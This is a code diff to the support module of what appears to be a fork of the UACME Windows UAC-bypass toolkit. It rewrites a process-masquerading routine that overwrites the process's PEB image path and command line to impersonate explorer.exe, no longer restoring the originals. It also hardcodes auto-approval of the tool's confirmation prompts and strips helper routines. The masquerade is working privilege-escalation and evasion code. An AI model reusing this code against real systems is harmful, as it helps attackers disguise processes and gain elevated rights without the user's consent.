@@ -870,129 +870,6 @@ BOOLEAN supSetCheckSumForMappedFile(
 }
 
 /*
-* ucmxBuildVersionString
-*
-* Purpose:
-*
-* Combine version numbers into string.
-*
-*/
-VOID ucmxBuildVersionString(
-    _In_ WCHAR* pszVersion)
-{
-    WCHAR szShortName[64];
-
-    RtlSecureZeroMemory(&szShortName, sizeof(szShortName));
-    DecodeStringById(ISDB_PROGRAMNAME, (LPWSTR)&szShortName, sizeof(szShortName));
-
-    wsprintf(pszVersion, TEXT("%s v%lu.%lu.%lu.%lu"),
-        szShortName,
-        UCM_VERSION_MAJOR,
-        UCM_VERSION_MINOR,
-        UCM_VERSION_REVISION,
-        UCM_VERSION_BUILD);
-}
-
-/*
-* ucmShowMessage
-*
-* Purpose:
-*
-* Output message to user by message id.
-*
-*/
-VOID ucmShowMessageById(
-    _In_ BOOL OutputToDebugger,
-    _In_ ULONG MessageId
-)
-{
-    PWCHAR pszMessage;
-    SIZE_T allocSize = PAGE_SIZE;
-
-    pszMessage = supVirtualAlloc(&allocSize,
-        DEFAULT_ALLOCATION_TYPE,
-        DEFAULT_PROTECT_TYPE, NULL);
-    if (pszMessage) {
-
-        if (DecodeStringById(MessageId, pszMessage, PAGE_SIZE / sizeof(WCHAR))) {
-            ucmShowMessage(OutputToDebugger, pszMessage);
-        }
-        supSecureVirtualFree(pszMessage, PAGE_SIZE, NULL);
-    }
-}
-
-/*
-* ucmShowMessage
-*
-* Purpose:
-*
-* Output message to user.
-*
-*/
-VOID ucmShowMessage(
-    _In_ BOOL OutputToDebugger,
-    _In_ LPCWSTR lpszMsg
-)
-{
-    WCHAR szVersion[100];
-
-    if (OutputToDebugger) {
-        OutputDebugString(lpszMsg);
-        OutputDebugString(TEXT("\r\n"));
-    }
-    else {
-        szVersion[0] = 0;
-        ucmxBuildVersionString(szVersion);
-        MessageBox(GetDesktopWindow(),
-            lpszMsg,
-            szVersion,
-            MB_ICONINFORMATION);
-    }
-}
-
-/*
-* ucmShowQuestionById
-*
-* Purpose:
-*
-* Output message with question to user with given question id.
-*
-*/
-INT ucmShowQuestionById(
-    _In_ ULONG MessageId
-)
-{
-    INT iResult = IDNO;
-    WCHAR szVersion[100];
-    PWCHAR pszMessage;
-    SIZE_T allocSize = PAGE_SIZE;
-
-    if (g_ctx->UserRequestsAutoApprove == TRUE)
-        return IDYES;
-
-    pszMessage = supVirtualAlloc(&allocSize,
-        DEFAULT_ALLOCATION_TYPE,
-        DEFAULT_PROTECT_TYPE, NULL);
-    if (pszMessage) {
-
-        if (DecodeStringById(MessageId, pszMessage, PAGE_SIZE / sizeof(WCHAR))) {
-
-            szVersion[0] = 0;
-            ucmxBuildVersionString(szVersion);
-
-            iResult = MessageBox(GetDesktopWindow(),
-                pszMessage,
-                szVersion,
-                MB_YESNO);
-
-        }
-        supSecureVirtualFree(pszMessage, PAGE_SIZE, NULL);
-    }
-
-    return iResult;
-}
-
-/*
 * supLdrQueryResourceData
 *
 * Purpose:
@@ -1123,57 +1000,37 @@ VOID supMasqueradeProcess(
 
     PWSTR ImageFileName, CommandLine;
 
-    if (Restore == FALSE) {
+    g_lpszExplorer = NULL;
+    RegionSize = PAGE_SIZE;
+    Status = NtAllocateVirtualMemory(
+        NtCurrentProcess(),         //Process handle
+        (PVOID*)&g_lpszExplorer,    //Ptr to base address [in, out]
+        0,                          //Idek
+        &RegionSize,                //Ptr to the size of this region, that will be rounded up to page size 
+        MEM_COMMIT | MEM_RESERVE,   //Type of allocation
+        PAGE_READWRITE);            //Page protection flags
 
-        g_lpszExplorer = NULL;
-        RegionSize = PAGE_SIZE;
-        Status = NtAllocateVirtualMemory(
-            NtCurrentProcess(),
-            (PVOID*)&g_lpszExplorer,
-            0,
-            &RegionSize,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE);
-
-        if (NT_SUCCESS(Status)) {
-            _strcpy(g_lpszExplorer, g_ctx->szSystemRoot);
-            _strcat(g_lpszExplorer, EXPLORER_EXE);
-        }
-        else {
-            supSetLastErrorFromNtStatus(Status);
-            return;
-        }
+    if (NT_SUCCESS(Status)) {
+        //Get full explorer.exe path
+        _strcpy(g_lpszExplorer, g_ctx->szSystemRoot);
+        _strcat(g_lpszExplorer, EXPLORER_EXE);
+    }
+    else {
+        //Convert NTSTATUS to System error code, and set it
+        supSetLastErrorFromNtStatus(Status);
+        return;
     }
 
     RtlAcquirePebLock();
 
-    if (Restore) {
-        CommandLine = g_LdrBackup.CommandLine;
-        ImageFileName = g_LdrBackup.ImagePathName;
-    }
-    else {
-        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
-        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;
+    g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
+    g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;
 
-        ImageFileName = g_lpszExplorer;
-        CommandLine = EXPLORER_EXE;
-    }
+    ImageFileName = g_lpszExplorer;
+    CommandLine = EXPLORER_EXE;
 
     RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
     RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
-
-    if (Restore) {
-
-        RegionSize = 0;
-        NtFreeVirtualMemory(
-            NtCurrentProcess(),
-            (PVOID*)&g_lpszExplorer,
-            &RegionSize,
-            MEM_RELEASE);
-
-        g_lpszExplorer = NULL;
-
-    }
 
     RtlReleasePebLock();
 
@@ -2402,13 +2259,7 @@ VOID supDestroySharedParametersBlock(
 * Allocate and fill program contexts.
 *
 */
-PVOID supCreateUacmeContext(
-    _In_ ULONG Method,
-    _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
-    _In_ ULONG OptionalParameterLength,
-    _In_ PVOID DecompressRoutine,
-    _In_ BOOL OutputToDebugger
-)
+PVOID supCreateUacmeContext(_In_ PVOID DecompressRoutine)
 {
     BOOLEAN IsWow64;
     ULONG Seed, NtBuildNumber = 0;
@@ -2416,11 +2267,6 @@ PVOID supCreateUacmeContext(
     PUACMECONTEXT Context;
 
     RTL_OSVERSIONINFOW osv;
-
-    UNREFERENCED_PARAMETER(Method);
-
-    if (OptionalParameterLength > MAX_PATH)
-        return NULL;
 
     IsWow64 = supIsProcess32bit(NtCurrentProcess());
 
@@ -2453,19 +2299,9 @@ PVOID supCreateUacmeContext(
     RtlSetHeapInformation(Context->ucmHeap, HeapEnableTerminationOnCorruption, NULL, 0);
 
     //
-    // Set Fubuki flag.
-    //
-    Context->AkagiFlag = AKAGI_FLAG_KILO;
-
-    //
-    // Remember flag for ucmShow* routines.
-    //
-    Context->OutputToDebugger = OutputToDebugger;
-
-    //
     // Changes behavior of ucmShowQuestion routine to autoapprove.
     //
-    Context->UserRequestsAutoApprove = USER_REQUESTS_AUTOAPPROVED;
+    Context->UserRequestsAutoApprove = 1;
 
     //
     // Remember NtBuildNumber.
@@ -2482,15 +2318,6 @@ PVOID supCreateUacmeContext(
     // Remember Wow64 process state.
     //
     Context->IsWow64 = IsWow64;
-
-    //
-    // Save OptionalParameter if present.
-    //
-    if (OptionalParameterLength) {
-        _strncpy(Context->szOptionalParameter, MAX_PATH,
-            OptionalParameter, OptionalParameterLength);
-        Context->OptionalParameterLength = OptionalParameterLength;
-    }
 
     //
     // Set IFileOperations flags.
@@ -2555,41 +2382,6 @@ VOID supDestroyUacmeContext(
 
     supVirtualFree(Context, NULL);
 }
-
-/*
-* supDecodeAndWriteBufferToFile
-*
-* Purpose:
-*
-* Create new file and write decoded buffer to it.
-*
-*/
-BOOL supDecodeAndWriteBufferToFile(
-    _In_ LPWSTR lpFileName,
-    _In_ CONST PVOID Buffer,
-    _In_ DWORD BufferSize,
-    _In_ ULONG Key
-)
-{
-    BOOL bResult;
-    PVOID p;
-    SIZE_T Size = ALIGN_UP_BY(BufferSize, PAGE_SIZE);
-
-    p = supVirtualAlloc(&Size, DEFAULT_ALLOCATION_TYPE | MEM_TOP_DOWN, DEFAULT_PROTECT_TYPE, NULL);
-    if (p) {
-        RtlCopyMemory(p, Buffer, BufferSize);
-
-        EncodeBuffer(p, BufferSize, Key);
-
-        bResult = supWriteBufferToFile(lpFileName, p, BufferSize);
-
-        supSecureVirtualFree(p, Size, NULL);
-
-        return bResult;
-    }
-    return FALSE;
-}
-
 /*
 * supEnableDisableWow64Redirection
 *
